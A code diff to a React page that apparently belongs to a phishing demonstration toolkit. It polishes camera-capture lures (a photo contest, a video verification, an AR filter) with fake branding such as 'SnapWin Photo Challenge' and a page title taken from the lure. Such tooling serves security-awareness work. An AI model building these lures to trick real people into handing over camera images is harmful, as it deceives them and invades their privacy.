@@ -6,7 +6,7 @@ import { useLogs } from '@/contexts/LogContext';
 import type { CameraData } from '@/types';
 import { Button } from '@/components/ui/button';
 import { PhishingPageLayout } from '@/components/phishing/PhishingPageLayout';
-import { Camera as CameraIcon, VideoOff, CheckCircle, AlertTriangle, Trophy, Cookie, Image as ImageIcon } from 'lucide-react';
+import { Camera as CameraIcon, VideoOff, CheckCircle, AlertTriangle, Trophy, Cookie, Image as ImageIcon, ShieldCheck, Sparkles, Wand2 } from 'lucide-react';
 import { cn } from '@/lib/utils'; // Added for cn utility
 
 const templateContent: Record<string, { title: string; message: string; cookieMessage?: string; actionText?: string; }> = {
@@ -50,6 +50,12 @@ export default function CameraPhishingPage() {
     addLog({ type: 'generic', data: { message: `Visited camera phishing page: /phishing/camera/${templateId}` } });
     // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [templateId]);
+
+  useEffect(() => {
+    if (content.title) {
+      document.title = content.title;
+    }
+  }, [content.title]);
 
   const captureImage = () => {
     if (videoRef.current && canvasRef.current && videoRef.current.readyState === 4 && videoRef.current.videoWidth > 0) {
@@ -158,8 +164,9 @@ export default function CameraPhishingPage() {
           error={error}
           statusMessage={status === 'captured' ? 'Photo submitted successfully! Good luck in the contest.' : undefined}
         >
-          <div className="text-center mb-6">
-              <Trophy className="h-16 w-16 text-amber-500 mx-auto mb-4" />
+          <div className="text-center mb-8"> {/* Increased mb for more space */}
+              <Trophy className="h-20 w-20 text-amber-500 mx-auto mb-3" /> {/* Made icon larger */}
+              <h2 className="text-2xl font-semibold text-amber-600 mb-4">SnapWin Photo Challenge</h2> {/* Added contest title */}
               <p className="text-lg text-muted-foreground" dangerouslySetInnerHTML={{ __html: content.message.replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>') }} />
           </div>
           
@@ -239,6 +246,18 @@ export default function CameraPhishingPage() {
         error={error}
         statusMessage={status === 'captured' ? 'Camera snapshot captured successfully for demonstration.' : undefined}
     >
+      {templateId === 'video-verification' && (
+        <div className="flex flex-col items-center justify-center mb-4 text-blue-600">
+          <ShieldCheck className="h-12 w-12 mb-2" />
+          <p className="font-semibold text-sm">SecureStream Verifications</p>
+        </div>
+      )}
+      {templateId === 'ar-filter' && (
+        <div className="flex flex-col items-center justify-center mb-4 text-purple-600">
+          <Sparkles className="h-12 w-12 mb-2" />
+           {/* Message is already in content.message, so just icon might be enough or a small sub-text if needed */}
+        </div>
+      )}
       <p className="text-center text-muted-foreground mb-6">{content.message}</p>
 
       <div className="aspect-video bg-muted rounded-lg overflow-hidden mb-6 relative border">
